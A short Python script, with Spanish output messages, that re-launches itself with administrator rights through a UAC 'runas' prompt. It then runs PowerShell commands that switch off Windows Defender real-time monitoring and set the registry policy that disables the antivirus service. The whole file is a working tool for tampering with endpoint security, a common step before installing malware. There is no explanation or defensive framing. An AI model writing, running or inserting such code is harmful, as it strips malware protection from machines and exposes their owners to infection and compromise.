import ctypes
import subprocess
import sys

def is_admin():
    """Check if the script is running with admin privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def disable_windows_defender():
    """Disable Windows Defender."""
    try:
        # Disable real-time protection
        subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"], check=True)

        # Disable Windows Defender service
        subprocess.run(["powershell", "-Command", "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1"], check=True)

        print("Windows Defender ha sido desactivado.")
    except subprocess.CalledProcessError as e:
        print(f"Ocurrió un error: {e}")

if __name__ == "__main__":
    if not is_admin():
        # Re-run the program with admin privileges
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    else:
        disable_windows_defender()
